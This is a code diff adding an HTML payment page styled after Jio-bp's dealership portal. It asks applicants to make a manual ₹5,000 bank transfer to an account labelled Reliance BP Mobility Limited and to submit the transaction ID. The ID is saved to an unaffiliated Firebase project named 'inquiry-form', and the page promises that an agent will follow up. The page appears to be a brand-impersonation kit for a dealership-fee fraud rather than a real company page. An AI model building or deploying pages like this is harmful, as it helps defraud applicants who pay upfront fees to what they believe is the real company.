@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Jio-bp Form + Professional Payment</title>
+    <style>
+        :root {
+            --primary: #0d6efd;
+            --accent: #007a3d;
+            --muted: #f5f7fb;
+            --card-bg: #ffffff;
+            --text: #222;
+        }
+
+        body {
+            margin: 0;
+            font-family: "Segoe UI", Roboto, Arial, sans-serif;
+            background: #f2f5f8;
+            color: var(--text);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* --- Navbar --- */
+        .navbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 28px;
+            background: #fff;
+            border-bottom: 1px solid #ececec
+        }
+
+        .navbar-left {
+            display: flex;
+            align-items: center;
+            gap: 10px
+        }
+
+        .logo-jio {
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            background: #00b140;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 700
+        }
+
+        .logo-bp {
+            width: 54px;
+            height: 54px;
+            background: transparent
+        }
+
+        .navbar-center {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333
+        }
+
+        .navbar-center span {
+            color: var(--accent)
+        }
+
+        .navbar-right a {
+            color: var(--accent);
+            text-decoration: none;
+            margin-left: 22px;
+            font-weight: 600
+        }
+
+        .color-strip {
+            display: flex;
+            height: 6px
+        }
+
+        .strip-green {
+            flex: 1;
+            background: #007a3d
+        }
+
+        .strip-yellow {
+            flex: 1;
+            background: #ffd600
+        }
+
+        .strip-dark {
+            flex: 1;
+            background: #006400
+        }
+
+        /* --- Page wrapper --- */
+        .page {
+            max-width: 1100px;
+            margin: 26px auto;
+            padding: 0 18px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 22px;
+            box-shadow: 0 6px 20px rgba(18, 30, 40, 0.06);
+            margin-bottom: 20px;
+            border: 1px solid #eef2f6
+        }
+
+        /* --- Simple placeholder form (kept minimal) --- */
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px
+        }
+
+        @media(min-width:800px) {
+            .form-grid {
+                grid-template-columns: repeat(3, 1fr)
+            }
+        }
+
+        .input-underline {
+            border: none;
+            border-bottom: 1px solid #d3d7db;
+            padding: 10px 8px;
+            background: transparent;
+            outline: none
+        }
+
+        .section-title {
+            color: var(--accent);
+            font-weight: 700;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #e6efe6;
+            padding-bottom: 8px
+        }
+
+        /* --- Payment container --- */
+        .payment-container {
+            max-width: 720px;
+            margin: 18px auto
+        }
+
+        .payment-card {
+            padding: 22px;
+            border-radius: 12px;
+            background: linear-gradient(180deg, #ffffff, #fbfdff);
+            box-shadow: 0 10px 30px rgba(10, 20, 40, 0.06);
+            border: 1px solid #e6eef7
+        }
+
+        .payment-title {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 14px
+        }
+
+        .payment-title h2 {
+            margin: 0;
+            font-size: 18px;
+            color: var(--primary)
+        }
+
+        .amount-row {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+            align-items: center
+        }
+
+        .amount-box {
+            flex: 1;
+            min-width: 180px
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #445;
+            margin-bottom: 6px;
+            font-weight: 600
+        }
+
+        .readonly-input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #d9e2f0;
+            background: #f8fbff;
+            font-size: 16px;
+            font-weight: 700;
+            color: #08306b;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6)
+        }
+
+        .bank-details {
+            background: #fbfcff;
+            padding: 14px;
+            border-radius: 10px;
+            border-left: 4px solid var(--primary);
+            margin-bottom: 16px;
+            color: #233
+        }
+
+        .bank-details p {
+            margin: 6px 0;
+            font-size: 14px
+        }
+
+        .txn-group {
+            margin-bottom: 14px
+        }
+
+        .txn-input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #d7dde6;
+            font-size: 15px;
+            outline: none
+        }
+
+        .txn-input:focus {
+            box-shadow: 0 6px 18px rgba(13, 110, 253, 0.12);
+            border-color: var(--primary)
+        }
+
+        .help-text {
+            font-size: 13px;
+            color: #6b7280;
+            margin-top: 6px
+        }
+
+        .error {
+            color: #c62828;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none
+        }
+
+        .actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            justify-content: flex-end;
+            margin-top: 6px
+        }
+
+        .btn {
+            background: var(--primary);
+            color: #fff;
+            padding: 12px 18px;
+            border-radius: 10px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 6px 18px rgba(13, 110, 253, 0.12)
+        }
+
+        .btn.secondary {
+            background: #eef5ff;
+            color: var(--primary);
+            border: 1px solid #d7e6ff
+        }
+
+        .btn:active {
+            transform: translateY(1px)
+        }
+
+        /* Popup */
+        .popup {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1200
+        }
+
+        .popup-card {
+            background: #fff;
+            padding: 22px;
+            border-radius: 12px;
+            max-width: 420px;
+            width: 92%;
+            text-align: center;
+            box-shadow: 0 12px 30px rgba(8, 16, 40, 0.15)
+        }
+
+        .popup-card h3 {
+            margin: 0 0 8px;
+            color: #198754
+        }
+
+        .popup-card p {
+            color: #333;
+            margin-bottom: 16px
+        }
+
+        .receipt {
+            background: #f8fbff;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px dashed #d7eafc;
+            text-align: left;
+            font-size: 14px;
+            margin-bottom: 12px
+        }
+
+        /* small */
+        .muted {
+            color: #6b7280;
+            font-size: 13px
+        }
+    </style>
+    <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+    }
+
+    /* Navbar */
+    .navbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #fff;
+      padding: 8px 40px;
+      border-bottom: 1px solid #eee;
+    }
+
+    /* Left logo section */
+    .navbar-left img {
+      height: 45px;
+    }
+
+    /* Center text */
+    .navbar-center {
+      font-size: 20px;
+      font-weight: 600;
+      color: #444;
+    }
+    .navbar-center span {
+      color: #007a3d; /* Jio-bp green */
+    }
+
+    /* Right links */
+    .navbar-right a {
+      margin-left: 25px;
+      text-decoration: none;
+      font-size: 14px;
+      color: #007a3d;
+      font-weight: 500;
+      transition: color 0.3s ease;
+    }
+    .navbar-right a:hover {
+      color: #00b140; /* lighter bp green */
+    }
+
+    /* Color strip */
+    .color-strip {
+      display: flex;
+      height: 6px;
+    }
+    .strip-green { flex: 1; background: #007a3d; }
+    .strip-yellow { flex: 1; background: #ffd600; }
+    .strip-darkgreen { flex: 1; background: #006400; }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .navbar {
+        flex-direction: column;
+        align-items: center;
+        padding: 12px 20px;
+      }
+      .navbar-right {
+        margin-top: 10px;
+      }
+      .navbar-right a {
+        margin: 8px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+    <!-- NAVBAR -->
+    <header class="navbar">
+          <div class="navbar-left">
+      <img src="/assets/img/logo-main screen.svg" alt="Jio-bp Logo">
+    </div>
+        <div class="navbar-center">Partners in <span>Progress</span></div>
+        <div class="navbar-right">
+            <a href="#">For Jio-bp dealership</a>
+            <a href="#">For EV Charging Station Partner</a>
+        </div>
+    </header>
+    <div class="color-strip">
+        <div class="strip-green"></div>
+        <div class="strip-yellow"></div>
+        <div class="strip-dark"></div>
+    </div>
+
+    <main class="page">
+    
+
+        <!-- PAYMENT SECTION -->
+        <section class="payment-container">
+            <div class="payment-card" role="region" aria-labelledby="pay-title">
+                <div class="payment-title">
+                    <h2 id="pay-title">💳 Payment Gateway</h2>
+                    <div class="muted">Secure & verified</div>
+                </div>
+
+                <!-- READONLY AMOUNT AT TOP -->
+                <div class="amount-row">
+                    <div class="amount-box">
+                        <label for="amountRead">Amount to Pay (INR)</label>
+                        <input id="amountRead" class="readonly-input" value="₹ 5,000" readonly />
+                    </div>
+
+                    <!-- optionally show a small note -->
+                    <div style="min-width:180px">
+                        <label style="visibility:hidden">spacer</label>
+                        <div class="muted"
+                            style="padding:12px 10px;border-radius:8px;background:#fff;border:1px solid #f0f4fb;font-size:13px">
+                            Transaction is manual — transfer UPI/netbanking and enter TXN ID.</div>
+                    </div>
+                </div>
+
+                <!-- Bank details -->
+                <div class="bank-details" aria-live="polite">
+                    <p><strong>Account Name:</strong> Reliance BP Mobility Limited</p>
+                    <p><strong>Account Number:</strong> 123456789012345</p>
+                    <p><strong>IFSC Code:</strong> HDFC0000123</p>
+                    <p><strong>Bank:</strong> HDFC Bank</p>
+                </div>
+
+                <!-- Transaction input -->
+                <div class="txn-group">
+                    <label for="txnId">Transaction ID</label>
+                    <input id="txnId" class="txn-input" placeholder="Enter transaction ID e.g. TXN123456789"
+                        aria-describedby="txnHelp" />
+                    <div id="txnHelp" class="help-text">Enter the transaction/reference ID from your bank/UPI app.
+                        Minimum 6 characters.</div>
+                    <div id="txnError" class="error">Error message</div>
+                </div>
+
+                <!-- actions -->
+                <div class="actions">
+                    <button class="btn secondary" type="button" onclick="clearTxn()">Clear</button>
+                    <button class="btn" type="button" onclick="submitTxn()">Submit Transaction</button>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- POPUP -->
+    <div id="popup" class="popup" role="dialog" aria-modal="true" aria-hidden="true">
+        <div class="popup-card" role="document">
+            <h3>✅ Transaction Submitted</h3>
+            <p>Your transaction has been recorded.</p>
+
+            <div class="receipt" id="receiptArea">
+                <strong>Transaction Details</strong>
+                <div style="margin-top:8px"><strong>Amount:</strong> ₹ 5,000</div>
+                <div id="receiptTxn" style="margin-top:6px"><strong>Transaction ID:</strong> —</div>
+                <div style="margin-top:6px" class="muted">We will verify and send confirmation within 48 hours.</div>
+            </div>
+
+            <div style="display:flex;gap:10px;justify-content:center">
+                <button class="btn secondary" onclick="downloadReceipt()">Download Receipt</button>
+                <button class="btn" onclick="closePopup()">OK</button>
+            </div>
+        </div>
+    </div>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDiUXKlL2uFqZTJF80OycHwEU44OMjH5U4",
+            authDomain: "inquiry-form-796d0.firebaseapp.com",
+            databaseURL: "https://inquiry-form-796d0-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "inquiry-form-796d0",
+            storageBucket: "inquiry-form-796d0.appspot.com",
+            messagingSenderId: "538374486014",
+            appId: "1:538374486014:web:0fd94f1b12a1c9e72f72af"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function getTokenFromUrl() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('token');
+        }
+
+        async function submitTxn() {
+            const txnEl = document.getElementById('txnId');
+            const txn = (txnEl.value || "").trim();
+            const err = document.getElementById('txnError');
+            const token = getTokenFromUrl();
+
+            if (!token) {
+                alert('Token not found. Please start from the main page.');
+                return;
+            }
+
+            // validate
+            if (!txn) {
+                err.textContent = "Please enter the Transaction ID.";
+                err.style.display = "block";
+                txnEl.focus();
+                return;
+            }
+            if (txn.length < 6) {
+                err.textContent = "Transaction ID must be at least 6 characters.";
+                err.style.display = "block";
+                txnEl.focus();
+                return;
+            }
+
+            // Store payment data in Firebase
+            try {
+                db.ref('dealership_applications/' + token + '/payment').set({
+                    transactionId: txn,
+                    amount: 5000,
+                    submittedAt: new Date().toISOString()
+                }).then(() => {
+                    // fill receipt
+                    document.getElementById('receiptTxn').innerHTML = "<strong>Transaction ID:</strong> " + escapeHtml(txn);
+
+                    // show popup
+                    const popup = document.getElementById('popup');
+                    popup.querySelector('h3').textContent = '✅ Your payment is processing';
+                    popup.querySelector('p').textContent = 'Our agent will connect with you shortly for the next process.';
+                    popup.style.display = 'flex';
+                    popup.setAttribute('aria-hidden', 'false');
+                });
+            } catch (error) {
+                alert('Error saving payment: ' + error.message);
+            }
+        }
+
+        function clearTxn() {
+            document.getElementById('txnId').value = "";
+            document.getElementById('txnError').style.display = "none";
+            document.getElementById('txnId').focus();
+        }
+
+        function closePopup() {
+            const popup = document.getElementById('popup');
+            popup.style.display = 'none';
+            popup.setAttribute('aria-hidden', 'true');
+
+            window.location.href = "/index.html";
+        }
+
+        // simple download of receipt as text file (client-side)
+        function downloadReceipt() {
+            const amount = document.getElementById('amountRead').value;
+            const txn = document.getElementById('txnId').value.trim() || '—';
+            const content = `Receipt\n\nAmount: ${amount}\nTransaction ID: ${txn}\nReference: Jio-bp Portal\nDate: ${new Date().toLocaleString()}\n\nThis is an auto-generated acknowledgement.`;
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'receipt_' + (txn || 'txn') + '.txt';
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+            URL.revokeObjectURL(url);
+        }
+
+        // basic html escape
+        function escapeHtml(s) { return String(s).replace(/[&<>"']/g, function (m) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]; }); }
+    </script>
+</body>
+
+</html>
